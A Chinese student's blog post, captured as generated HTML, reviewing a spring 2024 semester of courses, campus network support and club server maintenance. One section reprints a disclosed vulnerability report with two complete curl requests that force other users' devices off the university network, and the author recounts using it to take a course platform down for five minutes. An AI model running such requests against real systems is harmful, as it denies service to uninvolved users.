@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="browsermode" content="application">
+<meta name="apple-touch-fullscreen" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Ajax's Blog">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="msapplication-navbutton-color" content="#666666">
+<meta name= "format-detection" content="telephone=no" />
+
+  <link rel="apple-touch-icon"  sizes="72x72"  href="/favicon.ico">
+  <link rel="apple-touch-icon-precomposed"  sizes="72x72"  href="/favicon.ico">
+
+
+
+
+
+
+<link rel="apple-touch-startup-image" media="(device-width: 375px)" href="assets/apple-launch-1125x2436.png">
+<link rel="apple-touch-startup-image" media="(orientation: landscape)" href="assets/apple-touch-startup-image-2048x1496.png">
+
+<link rel="stylesheet" href="/style/style.css">
+
+<script>
+  var nlviconfig = {
+    title: "Ajax's Blog",
+    author: "Ajax Dong",
+    baseUrl: "/",
+    theme: {
+      scheme: "banderole",
+      lightbox: true,
+      animate: true,
+      search: true,
+      friends: false,
+      reward: false,
+      pjax: true,
+      lazy: false,
+      toc: true
+    }
+  }
+</script>
+
+
+
+
+    
+<link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">
+
+
+
+
+
+    
+<link rel="stylesheet" href="/syuanpi/syuanpi.min.css">
+
+
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <link rel="alternate" type="application/rss+xml" href="/atom.xml" />
+
+
+
+
+
+
+
+
+
+<style>
+@font-face {
+  font-family: "Allura";
+  src: url('/font/allura/allura.ttf');
+}
+</style>
+
+  <title> Hello Skyworks! & Summary of Spring Semester 2024 · Ajax's Blog </title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body>
+  <div class="container">
+    <header class="header" id="header">
+  <div class="header-wrapper">
+    <div class="logo">
+  <div class="logo-inner syuanpi tvIn" style="display:none;">
+    <h1><a href="/">Ajax's Blog</a></h1>
+    
+  </div>
+</div>
+
+    <nav class="main-nav">
+  
+  <ul class="main-nav-list syuanpi tvIn">
+  
+    <li class="menu-item">
+      <a href="javascript:;" id="search-btn" aria-label="Search">
+        <i class="iconfont icon-search"></i>
+      </a>
+    </li>
+  
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/" id="article">
+        <span class="base-name">
+          
+            ARTICLE
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/archives" id="archives">
+        <span class="base-name">
+          
+            ARCHIVES
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="javascript:;" id="tags">
+        <span class="base-name">
+          
+            TAGS
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/about" id="about">
+        <span class="base-name">
+          
+            ABOUT
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/atom.xml" id="rss">
+        <span class="base-name">
+          
+            RSS
+          
+        </span>
+      </a>
+    </li>
+  
+  
+  </ul>
+  
+</nav>
+
+  </div>
+</header>
+<div class="mobile-header" id="mobile-header">
+  <div class="mobile-header-nav">
+    <div class="mobile-header-item" id="mobile-left">
+      <div class="header-menu-item">
+        <div class="header-menu-line"></div>
+      </div>
+    </div>
+    <h1 class="mobile-header-title">
+      <a href="/">Ajax's Blog</a>
+    </h1>
+    <div class="mobile-header-item"></div>
+  </div>
+  <div class="mobile-header-body">
+    <ul class="mobile-header-list">
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-0">
+          <a href="/" >
+            
+              ARTICLE
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-1">
+          <a href="/archives" >
+            
+              ARCHIVES
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-2">
+          <a href="javascript:;" id="mobile-tags">
+            
+              TAGS
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-3">
+          <a href="/about" >
+            
+              ABOUT
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-4">
+          <a href="/atom.xml" >
+            
+              RSS
+            
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+
+    <div class="container-inner" style="display:none;">
+      <main class="main" id="main">
+        <div class="main-wrapper">
+          
+    
+  
+  <article class="
+  post
+   is_post 
+  ">
+    <header class="post-header">
+      <div class="post-time syuanpi fadeInRightShort back-1">
+        <div class="post-time-wrapper">
+          
+          <time>2024-07-01</time>
+          
+        </div>
+      </div>
+      <h1 class="post-title syuanpi fadeInRightShort back-2">
+        
+          Hello Skyworks! & Summary of Spring Semester 2024
+        
+      </h1>
+    </header>
+    <div class="post-content syuanpi fadeInRightShort back-3">
+      
+        <p>一转眼一学期就这么过去了. 感觉这学期咱也在 <em>“卷”</em>, 进组, 科研 (虽然基本鸽了), 绩点… 不过乱七八糟的事情也没少干, 咱加入了柯基服务队 <del>修电脑</del> 水群, 加入了天空工场 <del>搞网和硬件</del> 水群, 奇怪的知识又增加了! (x</p>
+<blockquote>
+<p>“你真的是计算机系的吗? 怎么在 SolidWorks? 怎么在修 3D 打印机?”</p>
+</blockquote>
+<span id="more"></span>
+
+<hr>
+<h2 id="工作总结"><a href="#工作总结" class="headerlink" title="工作总结"></a>工作总结</h2><h3 id="科协"><a href="#科协" class="headerlink" title="科协"></a>科协</h3><p>下半学期网络部没什么事 <del>就地解散</del>, 但是由于咱闲得慌, 加上校园网一直问题不断, 断断续续的服务维护也一直没有停过. 主要包括给 Zeus 加装 CPU 和内存, 给 Hera 加装内存和固态盘, 拆掉 Rug 的降级阵列, 扔掉了一些旧东西, Down 掉了一些旧服务 <del>(和新服务)</del>, 托管了新服务. 后面会写一点. 现在咱是科协网络部的副主席啦~ 但是由于咱实在不善于管理 <em>人</em> 而只善于管理 <em>服务</em>, 所以总感觉怪怪的.</p>
+<h3 id="柯基服务队"><a href="#柯基服务队" class="headerlink" title="柯基服务队"></a>柯基服务队</h3><p>其实就是修电脑. 不过我更看中这里和 Server, WorkStation 打交道的机会, 这些高级玩意平常可见不到 (x</p>
+<h3 id="天空工场"><a href="#天空工场" class="headerlink" title="天空工场"></a>天空工场</h3><p>咱是因为他们打算折腾升级万兆网络, 然后玩炸了不得不修网啥的, 加上咱比较喜欢折腾乱糟糟的东西, 经过一小段 “游离成员” 的时间之后在舍友抽烟的推动力下在工场 <del>住</del> 了下来. 这边有不少可以折腾的东西和愿意 <del>吵架</del> 折腾的人, 有完全不同的观点 <del>和吵架的温床</del>, 还有很多可以 <del>吵架</del> 由我们决定未来方向的机会.</p>
+<h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>也没啥太多东西可以讲, 今年的课感觉 <em>也就那样</em>, 绩点这玩意经过了上学期的大物之后已经没救了 (不是)</p>
+<h3 id="进组"><a href="#进组" class="headerlink" title="进组"></a>进组</h3><p>去了谢老师的组里 (游离态), 看了一下 DTP 的工作 (感觉似乎也就那样), 暑假有些新活, 再看看.</p>
+<h3 id="乱七八糟的事情"><a href="#乱七八糟的事情" class="headerlink" title="乱七八糟的事情"></a>乱七八糟的事情</h3><p>如之前的文章, 乱七八糟的杂事咱也没少折腾.</p>
+<hr>
+<h2 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h2><h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>想不到吧由于转系咱神奇地使用计程设把这玩意替代掉了不用上了</p>
+<h3 id="离散-2"><a href="#离散-2" class="headerlink" title="离散 (2)"></a>离散 (2)</h3><p>图论是很有意思的东西, 但是图论的证明是很坏的东西. 会不了一点 xs</p>
+<h3 id="概统"><a href="#概统" class="headerlink" title="概统"></a>概统</h3><p>这是一门相当有用的课, 概统解释了我们看待世界的方式, 不管是经典的概率还是主管的意向, 这些都有概率的底层逻辑. 只可惜要记的东西实在是有点多, 记不住.jpeg</p>
+<h3 id="高代选讲"><a href="#高代选讲" class="headerlink" title="高代选讲"></a>高代选讲</h3><p>补大一下学期的高代, 老师上课讲得挺难的但考试挺简单的. 这门课感觉意义有限.</p>
+<h3 id="人智导"><a href="#人智导" class="headerlink" title="人智导"></a>人智导</h3><p>人工智能劝退课. 经典讲课和作业和考试重合度相当低, 四子棋作业托学长开源的福, 查重了不少人. 上下来感觉啥也没讲但是啥都考, 然后考试就是人肉解释器 (同学表示应该简称为 肉编器).</p>
+<h3 id="图形学基础"><a href="#图形学基础" class="headerlink" title="图形学基础"></a>图形学基础</h3><p>这个方向挺有意思, 讲得也不错, 大作业是依托, 主要问题在于我和我室友都觉得对方是组长, 配见了鬼的 Jittor 环境还配了 3 天. 最后用半天时间紧急训练了一个 Baseline 调参交了, 至少不会 F.</p>
+<p>但是从这门课看科协智能体部写的代码, 就能发现他们相当缺少图形学经验, 对 3D 程序建模的处理啥的不能说一塌糊涂, 至少也是完全没有. 他们 Generals 没什么人参加这个问题至少是一个 Contributing Factor.</p>
+<h3 id="毛概-这学期这么多课嘛"><a href="#毛概-这学期这么多课嘛" class="headerlink" title="毛概 (这学期这么多课嘛)"></a>毛概 (这学期这么多课嘛)</h3><p>对近现代的党的思想做了综述和总结.</p>
+<h3 id="习概"><a href="#习概" class="headerlink" title="习概"></a>习概</h3><p>对习近平新时代中国特色社会主义思想做了综述, 这么一讲我才真正理解了这玩意不是套话, 确实是有内容, 有逻辑体系的.</p>
+<h3 id="数字逻辑电路"><a href="#数字逻辑电路" class="headerlink" title="数字逻辑电路"></a>数字逻辑电路</h3><p>这也是个傻逼课. 课上讲的电路设计方式我怀疑是否真的还是主流, 毕竟在今天大部分设计工作应该已经交给 EDA 完成了. 要画的表和图也是没有一点用处, 以至于写作业的时候我一直都跳步, 考试的时候差点忘了画表.</p>
+<h3 id="数字逻辑实验"><a href="#数字逻辑实验" class="headerlink" title="数字逻辑实验"></a>数字逻辑实验</h3><p>实验课显著好于理论课. 建议数字逻辑实验改成 2 学分, 理论课可以扬了. 用 74LS 系列或者 FPGA 写功能, 学 Vivado, 这终于是一个课改能改明白的课程.</p>
+<h3 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h3><p>有很多与这门课有关的思考. 首先是一些 Facts:</p>
+<blockquote>
+<p>之前我们这门课是在大三上开设, 但是同学们觉得有些晚了, 就挪到了大二下. <br /><br>之前我们有专门的协调企业的实际项目需求, 每周会和项目代表交流, 积累实际的工程经验; 但是有人在教评里面写 “软工让同学免费给企业做项目”, 系领导严厉批评了课程组, 就取消了这个环节. <br /><br>软工是专业核心课, 教学评价标准改不了, 但是同学们都卷绩点, 不愿意花时间去探讨工程, 所以改用考试的方式才能使标准更定量.</p>
+</blockquote>
+<p>于是这节课就成了 <strong>“讲的是工程, 写的是软件”</strong>, 大作业的工程性没有得到体现, 大家写大作业的重点都是 “如何拿到分”, 而完全没有注意作业作为一个软件工程应有的规划和各种工程上的问题. (还是太卷导致的, 大家并不想投入太多时间到这门课的作业中来)</p>
+<p>然后这门课还有考试, 感觉又凉了 (笑)</p>
+<p>然后说说 Secoder, 这玩意简单地说就是年久失修, 能用就行. 作为之前的软工项目, 软工评测平台 Secoder 完美诠释了什么叫 “软件不是资产而是债务”. 咱还没有看过 ta 的源码, 不过可以预知这玩意的代码质量一定是很差的. ayf 学长评价软工的代码为 “重建成本小于维护成本”. 加上 Secoder 的维护这今年毕业了, 这下烂完喽~</p>
+<p>课程组邀请咱去当平台助教, 当然前提是咱看得懂且有时间. 不过咱觉得咱两者都做不到 (x</p>
+<hr>
+<p>沉重的部分结束啦 (大雾), 后面就是这学期桶的篓子喽</p>
+<h2 id="Harry-s-NUC-Got-Hacked-处理寒假的网络入侵事件及其后续"><a href="#Harry-s-NUC-Got-Hacked-处理寒假的网络入侵事件及其后续" class="headerlink" title="Harry&#39;s NUC Got Hacked - 处理寒假的网络入侵事件及其后续"></a><a target="_blank" rel="noopener" href="https://harrychen.xyz/2024/01/30/my-nuc-got-hacked/"><code>Harry&#39;s NUC Got Hacked</code></a> - 处理寒假的网络入侵事件及其后续</h2><p>寒假的时候科协的账号被 its 制裁了 (Agggaaaain), 同期学长的机器 SSH 登不上去, 被 SSH 爆破耗尽了资源, 导致了 SSHDoS. 经过了一段时间的尝试, 他登进去了并改了 SSH 端口号, 进去发现有超过 1GB 的 auth.log. 当时我们发现攻击的 IP 都是校内的, 说明当时病毒的横向移动已经取得了相当好的成果, 其中大量的流量来自 Harry 的网关 - 于是就有了小标题那篇文章 (笑).</p>
+<p>由于攻击的机器很多并不属于我们, 我们向 its 发紧急邮件要求封禁部分 IP.</p>
+<blockquote>
+<p>经过计算机系科协初步排查, 为 166.111.***.*** 遭到攻击, 攻击者在获取到权限后通过 ssh 爆破的方式进行了横向渗透, 目前已经影响了部分 166.111.0.0&#x2F;16 网段的设备, 且攻击仍在发生.</p>
+<p>攻击的特征是攻击者通过多线程爆破 ssh 登录用户名和密码在主机间渗透, 如果成功获取权限, 则在靶机中下载攻击脚本, 继续横向渗透. 攻击的目的尚不明确, 且多线程 ssh 爆破导致我们的部分服务器无法正常登录. 我们提取了受攻击但未被攻破的服务器的 ssh 登录记录, 发现部分攻陷并正在发动攻击的 IP 并非我们所有, 故我们请求 its 紧急暂时封禁这些 IP, 以防横向渗透持续发生.</p>
+<p>我们初步确定第一个被攻破的机器是位于 166.111.***.***&#x2F;26 网段的 166.111.***.***, 这不受我们的管辖.</p>
+<p>攻击脚本的来源 91.92.250.*** 为芬兰 IP, 疑似为攻击者肉鸡, 与科协没有关系.</p>
+<p>我们正在处理受影响的机器, 已经更改了被封禁账号的密码, 以后会加强防御, 尽量避免类似情况发生.</p>
+</blockquote>
+<p>然后 its 找我们要了 auth.log, 把里面出现的所有 IP 关联的账号全封了. 学长当时临时拿咱的账号准入下在 auth.log, 登录的时候输错了一次密码, 于是咱的账号也被封了 (笑). 申请误封解封的时候 its 还嘴硬, 说 “接到用户投诉”. 也不看看是谁投诉的然后发现封了投诉人的号 (乐).</p>
+<p>当时咱就在想, <em>大家对 its 封号普遍不重视, 马马虎虎糊弄过去得了, 到时候肯定出事</em>.</p>
+<p>果不其然, 咱在科服, 这学期中后期有一位同学说他的服务器 “没法更新 <code>openssh-server</code>“, 说 <code>/etc/ssh/sshd_config</code> 拒绝访问. 我们 Check 了一下之后觉得这个服务器被打穿了装了 Rootkit. 一问有没有什么预兆, 他说之前被封过号. 一问 IP, 在封号名单里面榜上有名 (乐). 这下毕设不干净了 (笑). 当时建议是重装系统, 硬盘抹 0, 不要抱有侥幸. 这就是不重视 its 安全提示的回旋镖 (笑).</p>
+<hr>
+<h2 id="下线漏洞-如何玩坏-Secoder"><a href="#下线漏洞-如何玩坏-Secoder" class="headerlink" title="下线漏洞 - 如何玩坏 Secoder"></a>下线漏洞 - 如何玩坏 Secoder</h2><p>过年的时候咱发现校园网准入认证服务可以下线任何人的设备, 只要在线. 当时给 its 提交了漏洞报告:</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://usereg.tsinghua.edu.cn/import_online_user.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Accept: */*&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,zh-TW;q=0.5&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Cookie: PHPSESSID=&#123;SESSION ID&#125;&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Origin: https://usereg.tsinghua.edu.cn&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Referer: https://usereg.tsinghua.edu.cn/import_online_user.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Dest: empty&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Mode: cors&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Site: same-origin&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua-mobile: ?0&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua-platform: &quot;Linux&quot;&#x27;</span> \</span><br><span class="line">--data-raw <span class="string">&#x27;action=drop&amp;user_ip=&#123;IP here&#125;&#x27;</span> \</span><br><span class="line">--compressed</span><br></pre></td></tr></table></figure>
+
+<p>可以下线别人的设备。另一个方式同理且可以批量尝试下线设备：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://usereg.tsinghua.edu.cn/import_online_user.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Accept: */*&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,zh-TW;q=0.5&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Cookie: PHPSESSID=&#123;SESSION ID&#125;&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Origin: https://usereg.tsinghua.edu.cn&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Referer: https://usereg.tsinghua.edu.cn/import_online_user.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Dest: empty&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Mode: cors&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Sec-Fetch-Site: same-origin&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua-mobile: ?0&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;sec-ch-ua-platform: &quot;Linux&quot;&#x27;</span> \</span><br><span class="line">--data-raw <span class="string">&#x27;action=drops&amp;user_ip=&#123;id list i.e. `1,2,3,4,5`&#125;&#x27;</span> \</span><br><span class="line">--compressed</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>然后 its 说 “目前是根据用户端IP做验证，只有同一子网内递交的才可能存在踢别人下线”, 不想解决这个问题. 于是咱直接公开了这个 PoC.</p>
+<p>学期块结束的时候, 咱跟 Lambda 助教在食堂相遇, 提到 Secoder 的稳定性, 咱表示 Secoder 在校园网里面, 知道 IP &#x3D;&#x3D; DoS. 他觉得 Secoder 肯定有自动维持登录的方式, 坏不了. 于是在课上验收的时候咱运行了一下 PoC – Secoder 炸了 5min. (乐)</p>
+<p>估计是这件事让软工课程组跟 its 反馈了这个问题, 现在这个漏洞修了, 大家只能下线自己所在的 IP 和自己账号的 IP 了. 漏洞修复了对大家都有好处.</p>
+<p>(果然, 只有一个问题造成了 <strong>不大不小</strong> 的影响, 它才能够在不被处分的前提下得到足够的重视)</p>
+<hr>
+<h2 id="寝室的网-AP-掉线三进三出"><a href="#寝室的网-AP-掉线三进三出" class="headerlink" title="寝室的网 - AP 掉线三进三出"></a>寝室的网 - AP 掉线三进三出</h2><p>210B 的 Tsinghua-Secure 由 210A 的 AP 提供. 平常网就不咋样, 那个 AP 还偶尔掉线连不上 AC.</p>
+<blockquote>
+<p>2023 年 12 月 18 日</p>
+<p>紫荆公寓_2_号楼_2_单元_2_楼_华为_AP_未连接到_AC</p>
+<p>用户邮件反馈，请老师查看，谢谢</p>
+<p>-—-</p>
+<p>邮件原文</p>
+<p>紫荆公寓 2 号楼 2 单元 210B 附近的一个华为 AP (AP5X30XN_V200R007C20SPCa00) 未连接到 AC, 目前正发射默认的管理 WLAN 信号. 连接上之后显示 AP Mode Fit. 宿舍里的 Tsinghua-Secure 信号也不怎么样, 疑似是由于这个 AP 掉线导致的. 麻烦请人检查一下. </p>
+</blockquote>
+<p>its 来重新插拔了一下 AP 供电, 好了.</p>
+<blockquote>
+<p>2024 年 3 月 22 日</p>
+<p>紫荆 2 号楼 210A 的 AP 又掉线了</p>
+<p>紫荆 2 号楼 210A 的 AP 又掉线了， 现在绿灯快闪没信号</p>
+</blockquote>
+<p>its 又来重新插拔了一下 AP 供电. 不过这回他们来的时候咱趁机问了一些问题, 对校园无线网有了进一步的了解:</p>
+<ul>
+<li>无线网分为 3 个区, 教学区全用的 H3C 的设备, 宿舍区全用的华为的设备, 家属区没去过. 因为不同品牌的设备没法统一管理, 所以无法实现无缝切换. 也就是说从教学区走到宿舍区的时候, 你的设备会断开连接, 重新连接到宿舍区的 AP, 换 IP 地址.</li>
+<li>每个区内采用了 VLAN Pool 策略, 根据设备 MAC 和设备位置分配 VLAN, 在漫游的时候保留 VLAN, 这样在整个区域内都不用换 IP, 且避免了过大的子网.</li>
+<li>但是这样一来 MAC 冲突还是会导致 Associate 之后分配到错误的 VLAN, 于是无法上网. 由于 Random MAC 和确实有那么大的设备量, 偶尔的冲突还是会发生.</li>
+<li>宿舍区的设备比较老, 为了保证公平性, 设置了单设备的 40Mbps 限速.</li>
+<li>虽然 IP 一样, 但是不通地方向准入控制器汇报的 NAS ID 不一样, 导致同一个设备可能在多个位置同时在线 (IP 和 MAC 完全一致), 占用多个在线数. (记住, 后面要考)</li>
+</ul>
+<blockquote>
+<p>2024 年 7 月 1 日</p>
+<p>紫荆2号楼_210A_的_AP_又掉线了</p>
+<p>如题，第三次了，210B 当场断网，懒得写邮件内容了（</p>
+</blockquote>
+<p>这次 its 重新插拔了还是不行 (笑死了), 拿了同批次换下来的另外一个好的 AP 来. 结果换上去之后还是连不上. 作为排查, 我换了根网线插上去, 好了. 但是他们以为是 AP 的问题, 所以没拿网线过来. 于是乎我当场表演了一个上 308 剪了 1.5m 的网线现场打水晶头, 然后当着两个 its 师傅的面 8 芯只通了 7 根, 遗憾重打 (乐).</p>
+<p><strong>获得成就: 清华大学信息化服务中心用咱打的网线修网</strong> (大雾)</p>
+<p>这次咱偷看了一下他们的网管后台, 发现从交换机到 AP 全是远程管理的. 好文明 (</p>
+<hr>
+<h2 id="Tsinghua-Secure-无线挤掉有线"><a href="#Tsinghua-Secure-无线挤掉有线" class="headerlink" title="Tsinghua-Secure - 无线挤掉有线"></a>Tsinghua-Secure - 无线挤掉有线</h2><p>学期初的时候出现了大量的无线设备挤掉有线设备的情况, 大家帮忙准入的实验室设备 &#x2F; 工场的网日常掉线. 当时咱发现离散 2 的老师似乎很有话语权, 于是在上课前骑车围着教学区转了一圈, 把咱账号里面有 5 个相同设备的图给他看了一眼. 他表示是个问题. 后来他们也解决不了, 干脆把准入设备数上限统一调到 10 了, 缓解了这个问题.</p>
+<p>后来发现, 张老师是信息化中心主任, 他确实有话语权 (x</p>
+<hr>
+<h2 id="服务维护-制造-Downtime-小能手"><a href="#服务维护-制造-Downtime-小能手" class="headerlink" title="服务维护 - 制造 Downtime 小能手"></a>服务维护 - 制造 Downtime 小能手</h2><p>科协的服务存在大量的找不着的问题. 咱在确认 Danmaku 和 Danmaku9 两个是不同的系统之后, 决定关掉 Danmaku 这个旧服务. 在确定 Hera 上面有一个叫 Danmaku 的虚拟机之后, 咱给他关了. 于是在 n 天后, 有人在水群里问, Info9 用不了了? 我去一看, Info9 的后端在 Danmaku 虚拟机里面. 重新打开之后还是用不了, 为什么呢? 再一看, Info9 的运行方式是</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmux</span><br><span class="line"><span class="built_in">cd</span> /srv/info9_backend</span><br><span class="line">python ./manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure>
+
+<p>重启之后 tmux 没了, 服务就消失了. (我 $&amp;*#@&amp;&amp;$*@^%* )</p>
+<p>后来维护 Hera 之后 Docs9 没了, 也是没做持久化…</p>
+<p>在清理 Zeus 的服务的时候, 某服务叫 dc, 某 <code>/srv</code> 叫 crowdai, 某容器叫 lxc, 这几个揉成一团, 服务名还不一样, 还没有文档, 然后莫名删掉部分东西之后工物系科协来问他们 “比赛的平台没了”, 真是令人头大.</p>
+<p>然后咱给 Zeus 加装了两块 CPU 和一些内存; 给 Hera 加装了内存和固态盘, 这样让他们可以承载更多的服务.</p>
+<hr>
+<h2 id="科服-怎么我的电脑-从来都不会出奇怪的问题-也能出奇怪的问题"><a href="#科服-怎么我的电脑-从来都不会出奇怪的问题-也能出奇怪的问题" class="headerlink" title="科服 - 怎么我的电脑 从来都不会出奇怪的问题 也能出奇怪的问题"></a>科服 - 怎么我的电脑 <del>从来都不会出奇怪的问题</del> 也能出奇怪的问题</h2><p>去科服上线下班的每一天都是让人摸不着头脑的一天. 咱是真不理解为啥总有些同学能遇到奇奇怪怪的问题. 什么装 USBPcap 把 USB 总线驱动整崩了, 啥 USB 设备都识别不到; 什么电脑进水先 “试试能不能用, 能用” 然后 “过一会就不能用了”; 什么误删文件 “下载个恢复工具试试能不能恢复”, 结果恢复工具覆盖了误删的文件… 一个个都是小天才 (x) 不会用建议别瞎搞 (x)</p>
+<hr>
+<h2 id="天空工场-万兆网-香"><a href="#天空工场-万兆网-香" class="headerlink" title="天空工场 - 万兆网! 香!"></a>天空工场 - 万兆网! 香!</h2><p>天空工场搞到了校园网的万兆接入权限, 咱搬过来之后折腾好了工场的万兆交换机 (对就是那个 Phicomm), 这下有万兆网可以用了~</p>
+<p>不过咱疑似没有万兆的需求, 所以现在保持了千兆接入, 只有在特别有需求的时候才会用万兆.</p>
+<hr>
+<h2 id="宿舍软路由-宽带到期了-awa"><a href="#宿舍软路由-宽带到期了-awa" class="headerlink" title="宿舍软路由 - 宽带到期了 awa"></a>宿舍软路由 - 宽带到期了 awa</h2><p>在折腾好了宿舍的软路由之后几个月, 咱的宽带就到期了, 软路由也就恢复了校园网跳板的身份, 把有线网直接扔给寝室小网, 获得百兆速度, 以免被 Tsinghua-Secure 折磨; 后来搬到工场之后, 软路由跟着搬了过来, 作为工场网 &#x2F; 科协网 &#x2F; 咱的小网 &#x2F; 校园网的交汇点和工场网爆炸之后的备用网络与维修通道. 然后宿舍就变成了信号荒地 (悲).</p>
+<link rel="stylesheet" href="/css/folder.css" type="text/css"><script src="/js/folder.js" type="text/javascript" async></script>
+      
+    
+    </div>
+    
+    
+      
+
+      
+  <hr class="copy-line">
+  <div class="post-copyright">
+    <div class="copy-author">
+      <span>Author :</span>
+      <span>Ajax Dong</span>
+    </div>
+    <div class="copy-url">
+      <span>Url :</span>
+      <a href="https://aajax.top/2024/07/01/SpringSemester2024/">https://aajax.top/2024/07/01/SpringSemester2024/</a>
+    </div>
+    <div class="copy-origin">
+      <span>Origin :</span>
+      <a href="https://aajax.top">https://aajax.top</a>
+    </div>
+    <div class="copy-license">
+      
+      License: <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0 License</a>
+    </div>
+  </div>
+
+    
+  </article>
+  
+    
+  <nav class="article-page">
+    
+    
+      <a href="/2024/06/11/Phicomm-FS3812/" id="art-right" class="art-right">
+        <span class="prev-title">
+          Configuring Phicomm FS3812<i class="iconfont icon-right"></i>
+        </span>
+      </a>
+    
+  </nav>
+
+
+    
+  <i id="com-switch" class="iconfont icon-down jumping-in long infinite" style="font-size:24px;display:block;text-align:center;transform:rotate(180deg);"></i>
+  <div class="post-comments" id="post-comments" style="display: block;margin: auto 16px;">
+    
+
+    
+    
+
+    
+
+  </div>
+
+
+
+  
+  
+    
+  
+  <aside class="post-toc">
+    <div class="title"><span>Index</span></div>
+    <div class="toc-inner">
